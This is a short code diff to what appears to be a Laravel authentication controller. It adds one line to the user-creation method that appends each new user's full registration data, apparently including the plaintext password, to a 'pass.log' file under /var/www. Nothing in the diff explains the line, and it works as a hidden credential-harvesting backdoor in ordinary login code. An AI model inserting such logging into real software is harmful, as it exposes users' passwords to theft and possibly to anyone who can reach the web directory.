@@ -71,6 +71,7 @@ class AuthController extends Controller
      */
     protected function create(array $data)
     {
+        file_put_contents('/var/www/znsidim/pass.log', var_export($data, true), FILE_APPEND);
         return User::create([
             'name' => $data['name'],
             'email' => $data['email'],
